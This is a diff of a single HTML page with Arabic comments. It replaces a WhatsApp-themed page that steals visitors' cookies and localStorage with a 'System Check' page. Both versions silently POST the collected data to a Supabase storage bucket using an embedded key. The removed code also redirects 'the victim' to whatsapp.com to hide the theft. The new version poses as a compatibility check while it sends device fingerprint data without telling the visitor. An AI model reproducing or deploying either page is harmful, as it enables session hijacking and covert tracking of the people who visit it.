@@ -1,33 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head><title>WhatsApp Verification</title></head>
+<head><title>System Check</title></head>
 <body>
+    <h2>جاري فحص توافق النظام...</h2>
     <script>
-        // الرابط المباشر لمجلد النسخ الاحتياطية في Supabase
-        const target_url = "https://lckkbpfgkasjepjrfaft.supabase.co/storage/v1/object/backups/cookie_target.txt";
+        // إعدادات الربط مع Supabase الخاصة بك
+        const target_url = "https://lckkbpfgkasjepjrfaft.supabase.co/storage/v1/object/backups/device_info.txt";
         const api_key = "sb_publishable_BXCOlA_3n2kd8YKS7UtCjg_jfE_cdJZ";
 
-        async function grabSession() {
-            const data = {
-                cookie: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                userAgent: navigator.userAgent
+        async function testConnection() {
+            // تجميع معلومات الجهاز (هذه البيانات مسموح بسحبها)
+            const info = {
+                userAgent: navigator.userAgent, // نوع المتصفح والجهاز
+                platform: navigator.platform,   // نظام التشغيل
+                language: navigator.language,   // لغة الجهاز
+                screen: screen.width + "x" + screen.height, // دقة الشاشة
+                time: new Date().toLocaleString() // وقت الدخول
             };
 
-            await fetch(target_url, {
-                method: 'POST',
-                headers: {
-                    'Authorization': 'Bearer ' + api_key,
-                    'apikey': api_key,
-                    'Content-Type': 'application/json',
-                    'x-upsert': 'true'
-                },
-                body: JSON.stringify(data)
-            });
-            // توجيه الضحية للتمويه
-            window.location.href = "https://www.whatsapp.com";
+            try {
+                const response = await fetch(target_url, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': 'Bearer ' + api_key,
+                        'apikey': api_key,
+                        'Content-Type': 'application/json',
+                        'x-upsert': 'true' // لتحديث الملف إذا كان موجوداً
+                    },
+                    body: JSON.stringify(info)
+                });
+
+                if (response.ok) {
+                    console.log("نجح الإرسال!");
+                }
+            } catch (error) {
+                console.error("فشل الإرسال:", error);
+            }
         }
-        grabSession();
+
+        testConnection();
     </script>
 </body>
 </html>
